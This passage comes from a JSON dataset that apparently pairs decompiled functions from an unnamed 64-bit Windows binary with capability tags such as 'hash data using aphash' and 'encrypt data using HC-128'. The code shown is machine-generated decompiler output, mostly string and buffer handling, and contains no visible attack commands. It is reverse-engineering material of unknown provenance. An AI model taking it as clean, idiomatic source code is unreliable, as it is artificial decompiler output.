*(puVar8 + 6) = 7;\n    *puVar8 = 0;\n    if (auStack184._8_8_ < 8) {\ncode_r0x000180045f77:\n        auStack200 = CONCAT412(uVar18, CONCAT48(uVar17, CONCAT44(uVar16, uVar15)));\n        auStack184 = CONCAT412(uVar22, CONCAT48(uVar21, CONCAT44(uVar20, uVar19)));\n        if (7 < auStack264._8_8_) {\n            puVar9 = CONCAT44(uStack276, CONCAT22(uStack280._2_2_, uStack280));\n            puVar12 = puVar9;\n            if ((auStack264._8_8_ * 2 + 2 < 0x1000) ||\n               (puVar12 = *(puVar9 + 0xfffffffffffffffc),  puVar9 + (-8 - puVar12) < 0x20)) {\n                fcn.18008fb24(puVar12);\n                goto code_r0x000180045fc1;\n            }\n            goto code_r0x0001800462f1;\n        }\ncode_r0x000180045fc1:\n        auStack264 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack280._0_2_ = 0;\n        if (CONCAT44(uStack212, uStack216) < 8) {\ncode_r0x000180046016:\n            if (piVar14 != NULL) {\n                do {\n                    iVar5 = fcn.180046c40(arg1, arg2_01, iVar11, &uStack168);\n                    arg2 = uStack152;\n                    if (iVar5 < 0) goto code_r0x000180046231;\n                    auStack264 = CONCAT88(7, SUB168(auStack264, 0));\n                    uStack280._0_2_ = 0;\n                    uStack248 = 0x1f;\n                    fcn.18000d550(&uStack280, uStack152 + 2);\n                    puVar9 = &uStack168;\n                    if (7 < uStack144) {\n                        puVar9 = CONCAT62(Stack166, uStack168);\n                    }\n                    if (auStack264._8_8_ - auStack264._0_8_ < arg2) {\n                        uStack296 = arg2;\n                        fcn.180013690(&uStack280, arg2, 0, puVar9);\n                    }\n                    else {\n                        auStack264 = CONCAT88(auStack264._8_8_, auStack264._0_8_ + arg2);\n                        puVar12 = &uStack280;\n                        if (7 < auStack264._8_8_) {\n                            puVar12 = CONCAT44(uStack276, CONCAT22(uStack280._2_2_, uStack280));\n                        }\n                        fcn.1800ade80(puVar12 + auStack264._0_8_, puVar9, arg2 * 2);\n                        puVar12[auStack264._0_8_ + arg2] = 0;\n                    }\n                    if (auStack264._8_8_ - auStack264._0_8_ < 2) {\n                        uStack296 = 2;\n                        fcn.180013690(&uStack280, 2, 0, 0x1800f752c);\n                    }\n                    else {\n                        auStack264 = CONCAT88(auStack264._8_8_, auStack264._0_8_ + 2);\n                        puVar9 = &uStack280;\n                        if (7 < auStack264._8_8_) {\n                            puVar9 = CONCAT44(uStack276, CONCAT22(uStack280._2_2_, uStack280));\n                        }\n                        *(puVar9 + auStack264._0_8_) = 0xa000d;\n                        puVar9[auStack264._0_8_ + 2] = 0;\n                    }\n                    puVar9 = &uStack280;\n                    if (7 < auStack264._8_8_) {\n                        puVar9 = CONCAT44(uStack276, CONCAT22(uStack280._2_2_, uStack280));\n                    }\n                    if (auStack184._8_8_ - auStack184._0_8_ < auStack264._0_8_) {\n                        uStack296 = auStack264._0_8_;\n                        iVar11 = 0;\n                        puVar12 = auStack200;\n                        fcn.180013690(puVar12, auStack264._0_8_, 0, puVar9);\n                    }\n                    else {\n                        auStack184 = CONCAT88(auStack184._8_8_, auStack184._0_8_ + auStack264._0_8_);\n                        auStack200._0_8_ = auStack200;\n                        if (7 < auStack184._8_8_) {\n                        }\n                        iVar11 = auStack264._0_8_ * 2;\n                        puVar12 = auStack200._0_8_ + auStack184._0_8_ * 2;\n                        fcn.1800ade80(puVar12, puVar9, iVar11);\n                        *(auStack200._0_8_ + (auStack264._0_8_ + auStack184._0_8_) * 2) = 0;\n                    }\n                    if (7 < auStack264._8_8_) {\n                        puVar9 = CONCAT44(uStack276, CONCAT22(uStack280._2_2_, uStack280));\n                        puVar12 = puVar9;\n                        if ((0xfff < auStack264._8_8_ * 2 + 2) &&\n                           (puVar12 = *(puVar9 + 0xfffffffffffffffc),  0x1f < puVar9 + (-8 - puVar12)))\n                        goto code_r0x000180046303;\n                        fcn.18008fb24(puVar12);\n                    }\n                    arg2_01 = arg2_01 + 1;\n                } while (arg2_01 < piVar14);\n            }\n            uVar10 = fcn.180004ab0(puVar12, &uStack240, 5);\n            fcn.18000b420(puVar12, uVar10);\n            uVar10 = fcn.180004ab0(puVar12, &uStack240, 5);\n            fcn.18000b170(puVar12, auStack200, uVar10);\n            *(arg1 + 0x51) = 1;\n            fcn.180040650(arg1);\ncode_r0x000180046231:\n            if (7 < uStack144) {\n                iVar2 = CONCAT62(Stack166, uStack168);\n                iVar11 = iVar2;\n                if ((0xfff < uStack144 * 2 + 2) && (iVar11 = *(iVar2 + -8),  0x1f < (iVar2 - iVar11) - 8U))\n                goto code_r0x0001800462fd;\n                fcn.18008fb24(iVar11);\n            }\n            if (auStack184._8_8_ < 8) goto code_r0x0001800462ae;\n            iVar11 = auStack200._0_8_;\n            if (0xfff < auStack184._8_8_ * 2 + 2) {\n                iVar11 = *(auStack200._0_8_ + -8);\n                if (0x1f < (auStack200._0_8_ - iVar11) - 8U) {\n                    fcn.1800b3528(iVar11, auStack184._8_8_ * 2 + 0x29);\n                    goto code_r0x0001800462eb;\n                }\n            }\n            fcn.18008fb24(iVar11);\ncode_r0x0001800462ae:\n            fcn.18008fb00(uStack88 ^ auStack328);\n            return;\n        }\n        puVar9 = CONCAT62(Stack238, uStack240);\n        puVar12 = puVar9;\n        if ((CONCAT44(uStack212, uStack216) * 2 + 2 < 0x1000) ||\n           (puVar12 = *(puVar9 + 0xfffffffffffffffc),  puVar9 + (-8 - puVar12) < 0x20)) {\n            fcn.18008fb24(puVar12);\n            goto code_r0x000180046016;\n        }\n    }\n    else {\n        puVar12 = auStack200._0_8_;\n        if ((auStack184._8_8_ * 2 + 2 < 0x1000) ||\n           (puVar12 = *(auStack200._0_8_ + 0xfffffffffffffffc),  auStack200._0_8_ + (-8 - puVar12) < 0x20)) {\n            fcn.18008fb24(puVar12);\n            goto code_r0x000180045f77;\n        }\ncode_r0x0001800462eb:\n        fcn.1800b3528();\ncode_r0x0001800462f1:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x0001800462fd:\n    fcn.1800b3528();\ncode_r0x000180046303:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 3653
    },
    "18004e00": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18004e000(int64_t arg1, int64_t arg2, ulong noname_2, ulong arg4)\n\n{\n    int32_t *piVar1;\n    int64_t *******pppppppiVar2;\n    int32_t iVar3;\n    int64_t *******pppppppiVar4;\n    code *pcVar5;\n    int64_t iVar6;\n    uchar auVar7 [12];\n    ulong uVar8;\n    ulong *puVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    int64_t **ppiVar12;\n    int64_t **ppiVar13;\n    int64_t *piVar14;\n    uchar (*arg1_00) [16];\n    uint *puVar15;\n    uint64_t uVar16;\n    ushort *puVar17;\n    ushort *puVar18;\n    int64_t ********ppppppppiVar19;\n    int64_t iVar20;\n    int16_t *arg2_00;\n    ushort *puVar21;\n    int64_t ********arg4_00;\n    ushort *puVar22;\n    int64_t ********ppppppppiVar23;\n    uint64_t uVar24;\n    uchar (*pauVar25) [16];\n    ulong *puVar26;\n    uchar extraout_XMM0 [16];\n    uchar extraout_XMM0_00 [16];\n    uchar extraout_XMM0_01 [16];\n    uchar extraout_XMM0_02 [16];\n    uchar extraout_XMM0_03 [16];\n    uchar auVar27 [16];\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_20h;\n    ulong var_28h;\n    int64_t ********var_30h;\n    ulong var_38h;\n    ulong var_50h;\n    ulong var_58h_2;\n    ulong var_60h_2;\n    ulong var_78h;\n    ulong var_80h;\n    ulong var_88h;\n    ulong var_a0h;\n    ulong var_a8h;\n    ulong var_b8h;\n    ulong var_c0h;\n    ulong var_c8h;\n    ulong var_d8h;\n    ulong var_e0h;\n    ulong var_e8h;\n    ulong var_f8h;\n    ulong var_100h;\n    ulong var_108h;\n    ulong var_118h;\n    ulong var_120h;\n    ulong var_128h;\n    ulong var_138h;\n    ulong var_140h;\n    ulong var_148h;\n    ulong var_158h;\n    ulong var_160h;\n    ulong var_168h;\n    ulong var_178h;\n    ulong var_180h;\n    ulong var_188h;\n    ulong var_198h;\n    ulong var_1a0h;\n    ulong var_1a8h;\n    ulong var_1b8h;\n    ulong var_1c0h;\n    ulong var_1c8h;\n    ulong var_1d0h;\n    ulong var_1e8h;\n    ulong var_1f0h;\n    ulong var_208h;\n    ulong var_210h;\n    ulong var_220h;\n    ulong var_228h;\n    ulong var_260h;\n    uchar auStack936 [32];\n    int64_t *piStack904;\n    uchar auStack888 [16];\n    uchar auStack872 [16];\n    uint uStack856;\n    uint uStack852;\n    uint uStack848;\n    uint uStack844;\n    uchar auStack840 [16];\n    ulong uStack824;\n    uint uStack816;\n    uint uStack812;\n    uchar auStack808 [16];\n    int64_t iStack792;\n    uint64_t uStack784;\n    int64_t iStack776;\n    int64_t ********ppppppppiStack768;\n    ushort uStack760;\n    ushort uStack758;\n    uint uStack756;\n    uint uStack752;\n    uint uStack748;\n    uchar auStack744 [16];\n    ushort uStack728;\n    ushort uStack726;\n    uint uStack724;\n    uint uStack720;\n    uint uStack716;\n    uchar auStack712 [16];\n    ushort uStack696;\n    unkbyte6 Stack694;\n    ulong uStack680;\n    uint64_t uStack672;\n    ushort uStack664;\n    unkbyte6 Stack662;\n    ulong uStack648;\n    uint64_t uStack640;\n    ulong *puStack632;\n    uchar auStack624 [24];\n    int64_t *piStack600;\n    ulong *puStack592;\n    uchar auStack584 [24];\n    int64_t *piStack560;\n    ulong *puStack552;\n    uchar auStack544 [24];\n    int64_t *piStack520;\n    ushort uStack512;\n    unkbyte6 Stack510;\n    uint uStack496;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    ushort uStack480;\n    unkbyte6 Stack478;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    ushort uStack448;\n    unkbyte6 Stack446;\n    uint uStack432;\n    uint uStack428;\n    uint uStack424;\n    uint uStack420;\n    ushort uStack416;\n    unkbyte6 Stack414;\n    uint uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    ushort uStack352;\n    unkbyte6 Stack350;\n    ulong uStack336;\n    uint64_t uStack328;\n    ushort uStack320;\n    unkbyte6 Stack318;\n    ulong uStack304;\n    uint64_t uStack296;\n    ushort uStack288;\n    unkbyte6 Stack286;\n    ulong uStack272;\n    uint64_t uStack264;\n    int64_t ********ppppppppiStack256;\n    int64_t *piStack248;\n    int64_t *piStack240;\n    int64_t *piStack232;\n    ulong uStack224;\n    int64_t ********appppppppiStack216 [3];\n    uint64_t uStack192;\n    int64_t ********appppppppiStack184 [3];\n    uint64_t uStack160;\n    ushort uStack152;\n    unkbyte6 Stack150;\n    int64_t *var_80h_2;\n    uint64_t var_78h_2;\n    ulong var_bp_70h;\n    ulong var_68h;\n    ulong var_60h;\n    ulong var_58h;\n    ulong var_50h_2;\n    int16_t iStack80;\n    int16_t aiStack78 [3];\n    uint64_t var_bp_40h;\n    ulong var_38h_2;\n    ulong var_30h_2;\n    ulong var_20h_2;\n    ulong var_18h;\n    ulong var_10h_2;\n    \n    uStack224 = 0xfffffffffffffffe;\n    var_bp_40h = *0x180123080 ^ auStack936;\n    ppppppppiStack768 = var_30h;\n    var_80h_2 = NULL;\n    var_78h_2 = 7;\n    uStack152 = 0;\n    fcn.180010d70(&uStack152, 0x1800f843c, 2);\n    iVar20 = *(arg1 + 200) + arg2 * 0x48;\n    uVar24 = *(iVar20 + 0x38) - *(iVar20 + 0x30) >> 4;\n    if (99 < uVar24) {\n        uVar24 = 99;\n    }\n    puStack632 = NULL;\n    uStack784 = uVar24;\n    iStack776 = iVar20;\n    fcn.180010540(auStack624);\n    fcn.1800131f0(&puStack632, 0x1800fa2a8, 0x1800fa2c0);\n    uVar8 = fcn.180013060(&uStack480, arg4, &puStack632, 0x1800f7dd4);\n    fcn.18000d960(arg4, uVar8);\n    if (CONCAT44(uStack452, uStack456) < 8) {\ncode_r0x00018004e149:\n        uStack452 = *0x18010190c;\n        uStack456 = *0x180101908;\n        uStack460 = *0x180101904;\n        uStack464 = *0x180101900;\n        uStack480 = 0;\n        if (puStack632 != NULL) {\n            LOCK();\n            piVar1 = puStack632 + 0x2c;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            puVar9 = puStack632;\n            if (iVar3 == 1) {\n                while (puVar9 != NULL) {\n                    puVar26 = puVar9[2];\n                    puVar9[2] = 0;\n                    (***puVar9)(puVar9, 1);\n                    puVar9 = puVar26;\n                }\n            }\n        }\n        puStack632 = NULL;\n        if ((piStack600 != NULL) && (puVar9 = (**(*piStack600 + 0x10))(),  puVar9 != NULL)) {\n            (***puVar9)(puVar9, 1);\n        }\n        puStack592 = NULL;\n        fcn.180010540(auStack584);\n        fcn.1800131f0(&puStack592, 0x1800fa2c8, 0x1800fa2e6);\n        uVar8 = fcn.180013060(&uStack448, iVar20, &puStack592, 0x1800f7e54);\n        fcn.18000d960(arg4, uVar8);\n        if (7 < CONCAT44(uStack420, uStack424)) {\n            iVar6 = CONCAT62(Stack446, uStack448);\n            iVar11 = iVar6;\n            if ((CONCAT44(uStack420, uStack424) * 2 + 2 < 0x1000) ||\n               (iVar11 = *(iVar6 + -8),  (iVar6 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018004e25c;\n            }\n            goto code_r0x00018004efc6;\n        }\ncode_r0x00018004e25c:\n        uStack420 = *0x18010190c;\n        uStack424 = *0x180101908;\n        uStack428 = *0x180101904;\n        uStack432 = *0x180101900;\n        uStack448 = 0;\n        if (puStack592 != NULL) {\n            LOCK();\n            piVar1 = puStack592 + 0x2c;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            puVar9 = puStack592;\n            if (iVar3 == 1) {\n                while (puVar9 != NULL) {\n                    puVar26 = puVar9[2];\n                    puVar9[2] = 0;\n                    (***puVar9)(puVar9, 1);\n                    puVar9 = puVar26;\n                }\n            }\n        }\n        puStack592 = NULL;\n        if ((piStack560 != NULL) && (puVar9 = (**(*piStack560 + 0x10))(),  puVar9 != NULL)) {\n            (***puVar9)(puVar9, 1);\n        }\n        puStack552 = NULL;\n        fcn.180010540(auStack544);\n        fcn.1800131f0(&puStack552, 0x1800fa300, 0x1800fa30e);\n        puVar9 = fcn.180013060(&uStack416, arg4, &puStack552, 0x1800f7e6c);\n        uStack496 = *0x180101900;\n        uStack492 = *0x180101904;\n        uStack488 = *0x180101908;\n        uStack484 = *0x18010190c;\n        uStack512 = 0;\n        uVar8 = 0x32;\n        if (puVar9[2] < 0x32) {\n            uVar8 = puVar9[2];\n        }\n        if (7 < puVar9[3]) {\n            puVar9 = *puVar9;\n        }\n        fcn.180010d70(&uStack512, puVar9, uVar8);\n        fcn.18000d960(arg4, &uStack512);\n        if (7 < CONCAT44(uStack484, uStack488)) {\n            iVar6 = CONCAT62(Stack510, uStack512);\n            iVar11 = iVar6;\n            if ((CONCAT44(uStack484, uStack488) * 2 + 2 < 0x1000) ||\n               (iVar11 = *(iVar6 + -8),  (iVar6 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018004e3b9;\n            }\n            goto code_r0x00018004efcc;\n        }\ncode_r0x00018004e3b9:\n        if (7 < CONCAT44(uStack388, uStack392)) {\n            iVar6 = CONCAT62(Stack414, uStack416);\n            iVar11 = iVar6;\n            if ((CONCAT44(uStack388, uStack392) * 2 + 2 < 0x1000) ||\n               (iVar11 = *(iVar6 + -8),  (iVar6 - iVar11) - 8U < 0x20)) {\n                fcn.18008fb24(iVar11);\n                goto code_r0x00018004e3ff;\n            }\n            goto code_r0x00018004efd2;\n        }\ncode_r0x00018004e3ff:\n        uStack388 = *0x18010190c;\n        uStack392 = *0x180101908;\n        uStack396 = *0x180101904;\n        uStack400 = *0x180101900;\n        uStack416 = 0;\n        if (puStack552 != NULL) {\n            LOCK();\n            piVar1 = puStack552 + 0x2c;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            puVar9 = puStack552;\n            if (iVar3 == 1) {\n                while (puVar9 != NULL) {\n                    puVar26 = puVar9[2];\n                    puVar9[2] = 0;\n                    (***puVar9)(puVar9, 1);\n                    puVar9 = puVar26;\n                }\n            }\n        }\n        puStack552 = NULL;\n        if ((piStack520 != NULL) && (piVar10 = (**(*piStack520 + 0x10))(),  piVar10 != NULL)) {\n            (***piVar10)(piVar10, 1);\n            piStack520 = piVar10;\n        }\n        puVar9 = fcn.18004dd40(piStack520, appppppppiStack216, 0, iVar20 + 0x20);\n        uStack648 = CONCAT44(*0x180101904, *0x180101900);\n        uStack640 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack664 = 0;\n        if (puVar9[2] < 8) goto code_r0x00018004efd8;\n        iVar11 = puVar9[2] - 8;\n        iVar20 = -1;\n        if (iVar11 != -1) {\n            iVar20 = iVar11;\n        }\n        if (7 < puVar9[3]) {\n            puVar9 = *puVar9;\n        }\n        fcn.180010d70(&uStack664, puVar9 + 2, iVar20);\n        arg2_00 = aiStack78;\n        do {\n            arg2_00 = arg2_00 + -1;\n            uVar16 = uVar24 / 10;\n            *arg2_00 = uVar24 + uVar16 * -10 + 0x30;\n            uVar24 = uVar16;\n        } while (uVar16 != 0);\n        uStack680 = CONCAT44(*0x180101904, *0x180101900);\n        uStack672 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack696 = 0;\n        if (arg2_00 != aiStack78) {\n            fcn.180010d70(&uStack696, arg2_00, aiStack78 - arg2_00 >> 1);\n        }\n        ppiVar12 = fcn.18002e7e0(&uStack288, 0x1800f7fc4, arg4);\n        piVar10 = ppiVar12[2];\n        if (ppiVar12[3] == piVar10) {\n            piStack904 = 0x1;\n            ppiVar12 = fcn.180013690(ppiVar12, 1, 0, 0x1800f7e7c);\n        }\n        else {\n            ppiVar12[2] = piVar10 + 1U;\n            ppiVar13 = ppiVar12;\n            if (0x7 < ppiVar12[3]) {\n                ppiVar13 = *ppiVar12;\n            }\n            *(ppiVar13 + piVar10 * 2) = 0x5d;\n            *(ppiVar13 + (piVar10 + 1U) * 2) = 0;\n        }\n        piVar10 = var_80h_2;\n        uStack824._4_4_ = *(ppiVar12 + 4);\n        puVar21 = *ppiVar12;\n        uStack816 = *(ppiVar12 + 1);\n        uStack812 = *(ppiVar12 + 0xc);\n        uStack824._0_2_ = *ppiVar12;\n        uStack824._2_2_ = *ppiVar12 >> 0x10;\n        auVar7 = **(ppiVar12 + 2);\n        auStack808 = *(ppiVar12 + 2);\n        ppiVar12[2] = NULL;\n        ppiVar12[3] = 0x7;\n        *ppiVar12 = 0;\n        puVar22 = CONCAT62(Stack150, uStack152);\n        puVar18 = &uStack152;\n        if (7 < var_78h_2) {\n            puVar18 = puVar22;\n        }\n        auStack808._0_8_ = SUB128(auVar7, 0);\n        auStack808._8_8_ = SUB168(auStack808 >> 0x40, 0);\n        if (auStack808._8_8_ - auStack808._0_8_ < var_80h_2) {\n            piStack904 = var_80h_2;\n            piVar14 = fcn.180013690(&uStack824, var_80h_2, 0, puVar18);\n            puVar22 = CONCAT62(Stack150, uStack152);\n            piVar10 = var_80h_2;\n            auVar27 = extraout_XMM0_00;\n        }\n        else {\n            iVar20 = auStack808._0_8_ + var_80h_2;\n            auStack808 = CONCAT88(auStack808._8_8_, iVar20);\n            puVar17 = &uStack824;\n            if (7 < auStack808._8_8_) {\n                puVar17 = puVar21;\n            }\n            fcn.1800ade80(puVar17 + auStack808._0_8_, puVar18, var_80h_2 * 2);\n            puVar17[iVar20] = 0;\n            piVar14 = &uStack824;\n            auVar27 = extraout_XMM0;\n        }\n        auStack840 = auVar27 & 0x0;\n        puVar21 = *piVar14;\n        uStack856._0_2_ = *piVar14;\n        uStack856._2_2_ = *piVar14 >> 0x10;\n        uStack852 = *(piVar14 + 4);\n        uStack848 = *(piVar14 + 1);\n        uStack844 = *(piVar14 + 0xc);\n        auVar7 = **(piVar14 + 2);\n        auStack840 = *(piVar14 + 2);\n        piVar14[2] = 0;\n        piVar14[3] = 7;\n        *piVar14 = 0;\n        auStack840._0_8_ = SUB128(auVar7, 0);\n        auStack840._8_8_ = SUB168(auStack840 >> 0x40, 0);\n        if (auStack840._8_8_ - auStack840._0_8_ < 6) {\n            piStack904 = 0x6;\n            puVar15 = fcn.180013690(&uStack856, 6, 0, 0x1800fa310);\n            auVar27 = extraout_XMM0_02;\n        }\n        else {\n            auStack840 = CONCAT88(auStack840._8_8_, auStack840._0_8_ + 6);\n            puVar18 = &uStack856;\n            if (7 < auStack840._8_8_) {\n                puVar18 = puVar21;\n            }\n            fcn.1800ade80(puVar18 + auStack840._0_8_, 0x1800fa310, 0xc);\n            puVar18[auStack840._0_8_ + 6] = 0;\n            puVar15 = &uStack856;\n            auVar27 = extraout_XMM0_01;\n        }\n        auStack712 = auVar27 & 0x0;\n        uStack728 = *puVar15;\n        uStack726 = *puVar15 >> 0x10;\n        uStack724 = puVar15[1];\n        uStack720 = puVar15[2];\n        uStack716 = puVar15[3];\n        auStack712 = *(puVar15 + 4);\n        *(puVar15 + 4) = 0;\n        *(puVar15 + 6) = 7;\n        *puVar15 = 0;\n        arg1_00 = fcn.18002e490(&uStack320, &uStack728, &uStack696);\n        uVar24 = var_78h_2;\n        puVar21 = &uStack152;\n        if (7 < var_78h_2) {\n            puVar21 = puVar22;\n        }\n        iVar20 = *arg1_00[1];\n        uVar16 = *(arg1_00[1] + 8);\n        if (uVar16 - iVar20 < piVar10) {\n            piStack904 = piVar10;\n            arg1_00 = fcn.180013690(arg1_00, piVar10, 0, puVar21);\n            puVar22 = CONCAT62(Stack150, uStack152);\n            piVar10 = var_80h_2;\n            uVar24 = var_78h_2;\n        }\n        else {\n            *arg1_00[1] = iVar20 + piVar10;\n            pauVar25 = arg1_00;\n            if (7 < uVar16) {\n                pauVar25 = **arg1_00;\n            }\n            fcn.1800ade80(*pauVar25 + iVar20 * 2, puVar21, piVar10 * 2);\n            *(*pauVar25 + (iVar20 + piVar10) * 2) = 0;\n        }\n        auVar27 = *arg1_00;\n        auStack888 = auVar27;\n        auVar7 = *arg1_00[1];\n        auStack872 = arg1_00[1];\n        *arg1_00[1] = 0;\n        *(arg1_00[1] + 8) = 7;\n        **arg1_00 = 0;\n        auStack872._0_8_ = SUB128(auVar7, 0);\n        auStack872._8_8_ = SUB168(auStack872 >> 0x40, 0);\n        if (auStack872._8_8_ - auStack872._0_8_ < 4) {\n            piStack904 = 0x4;\n            puVar15 = fcn.180013690(auStack888, 4, 0, L\"EOL=\");\n            auVar27 = extraout_XMM0_03;\n        }\n        else {\n            auStack872 = CONCAT88(auStack872._8_8_, auStack872._0_8_ + 4);\n            auStack888._0_8_ = auStack888;\n            if (7 < auStack872._8_8_) {\n                auStack888._0_8_ = SUB168(auVar27, 0);\n            }\n            *(auStack888._0_8_ + auStack872._0_8_ * 2) = 0x3d004c004f0045;\n            *(auStack888._0_8_ + (auStack872._0_8_ + 4) * 2) = 0;\n            puVar15 = auStack888;\n        }\n        auStack744 = auVar27 & 0x0;\n        uStack760 = *puVar15;\n        uStack758 = *puVar15 >> 0x10;\n        uStack756 = puVar15[1];\n        uStack752 = puVar15[2];\n        uStack748 = puVar15[3];\n        auStack744 = *(puVar15 + 4);\n        *(puVar15 + 4) = 0;\n        *(puVar15 + 6) = 7;\n        *puVar15 = 0;\n        puVar9 = fcn.18002e490(&uStack352, &uStack760, &uStack664);\n        puVar21 = &uStack152;\n        if (7 < uVar24) {\n            puVar21 = puVar22;\n        }\n        iVar20 = puVar9[2];\n        if (puVar9[3] - iVar20 < piVar10) {\n            piStack904 = piVar10;\n            puVar9 = fcn.180013690(puVar9, piVar10, 0, puVar21);\n            puVar22 = CONCAT62(Stack150, uStack152);\n            piVar10 = var_80h_2;\n            uVar24 = var_78h_2;\n        }\n        else {\n            puVar9[2] = iVar20 + piVar10;\n            puVar26 = puVar9;\n            if (7 < puVar9[3]) {\n                puVar26 = *puVar9;\n            }\n            fcn.1800ade80(puVar26 + iVar20 * 2, puVar21, piVar10 * 2);\n            *(puVar26 + (iVar20 + piVar10) * 2) = 0;\n        }\n        uVar16 = 0;\n        uStack384 = *puVar9;\n        uStack380 = *(puVar9 + 4);\n        uStack376 = *(puVar9 + 1);\n        uStack372 = *(puVar9 + 0xc);\n        uStack368 = *(puVar9 + 2);\n        uStack364 = *(puVar9 + 0x14);\n        uStack360 = *(puVar9 + 3);\n        uStack356 = *(puVar9 + 0x1c);\n        puVar9[2] = 0;\n        puVar9[3] = 7;\n        *puVar9 = 0;\n        fcn.18000d960(var_30h, &uStack384);\n        if (7 < CONCAT44(uStack356, uStack360)) {\n            ppppppppiVar19 = CONCAT44(uStack380, uStack384);\n            var_30h = ppppppppiVar19;\n            if ((CONCAT44(uStack356, uStack360) * 2 + 2 < 0x1000) ||\n               (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20)) {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004e9b2;\n            }\n            goto code_r0x00018004efde;\n        }\ncode_r0x00018004e9b2:\n        if (7 < uStack328) {\n            ppppppppiVar19 = CONCAT62(Stack350, uStack352);\n            var_30h = ppppppppiVar19;\n            if ((uStack328 * 2 + 2 < 0x1000) || (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20))\n            {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004e9f8;\n            }\n            goto code_r0x00018004efe4;\n        }\ncode_r0x00018004e9f8:\n        uStack336 = CONCAT44(*0x180101904, *0x180101900);\n        uStack328 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack352 = 0;\n        if (7 < auStack744._8_8_) {\n            ppppppppiVar19 = CONCAT44(uStack756, CONCAT22(uStack758, uStack760));\n            var_30h = ppppppppiVar19;\n            if ((auStack744._8_8_ * 2 + 2 < 0x1000) ||\n               (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20)) {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004ea50;\n            }\n            goto code_r0x00018004efea;\n        }\ncode_r0x00018004ea50:\n        auStack744 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack760 = 0;\n        if (7 < auStack872._8_8_) {\n            var_30h = auStack888._0_8_;\n            if ((auStack872._8_8_ * 2 + 2 < 0x1000) ||\n               (var_30h = auStack888._0_8_[-1],  auStack888._0_8_ + (-8 - var_30h) < 0x20)) {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004eaa4;\n            }\n            goto code_r0x00018004eff0;\n        }\ncode_r0x00018004eaa4:\n        auStack872 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        auStack888 = auStack888 & 0xffffffffffff0000;\n        if (7 < uStack296) {\n            ppppppppiVar19 = CONCAT62(Stack318, uStack320);\n            var_30h = ppppppppiVar19;\n            if ((uStack296 * 2 + 2 < 0x1000) || (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20))\n            {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004eafe;\n            }\n            goto code_r0x00018004eff6;\n        }\ncode_r0x00018004eafe:\n        uStack304 = CONCAT44(*0x180101904, *0x180101900);\n        uStack296 = CONCAT44(*0x18010190c, *0x180101908);\n        uStack320 = 0;\n        if (7 < auStack712._8_8_) {\n            ppppppppiVar19 = CONCAT44(uStack724, CONCAT22(uStack726, uStack728));\n            var_30h = ppppppppiVar19;\n            if ((auStack712._8_8_ * 2 + 2 < 0x1000) ||\n               (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20)) {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004eb56;\n            }\n            goto code_r0x00018004effc;\n        }\ncode_r0x00018004eb56:\n        auStack712 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack728 = 0;\n        if (7 < auStack840._8_8_) {\n            ppppppppiVar19 = CONCAT44(uStack852, CONCAT22(uStack856._2_2_, uStack856));\n            var_30h = ppppppppiVar19;\n            if ((auStack840._8_8_ * 2 + 2 < 0x1000) ||\n               (var_30h = ppppppppiVar19[-1],  ppppppppiVar19 + (-8 - var_30h) < 0x20)) {\n                fcn.18008fb24(var_30h);\n                goto code_r0x00018004ebaa;\n            }\n            goto code_r0x00018004f002;\n        }\ncode_r0x00018004ebaa:\n        auStack840 = CONCAT88(CONCAT44(*0x18010190c, *0x180101908), CONCAT44(*0x180101904, *0x180101900));\n        uStack856._0_2_ = 0;\n        if (7 < auStack808._8_8_) {\n            ppppppppiVar19 = CONCAT44(uStack824._4_4_, CONCAT22(uStack824._2_2_, uStack824));\n            var_30h = ppppppppiVar19;\n            if ((auStack808._8_8_ * 2 + 2 < 0x1000) ||\n               (var_30h = ppppppppiVar19[-1],  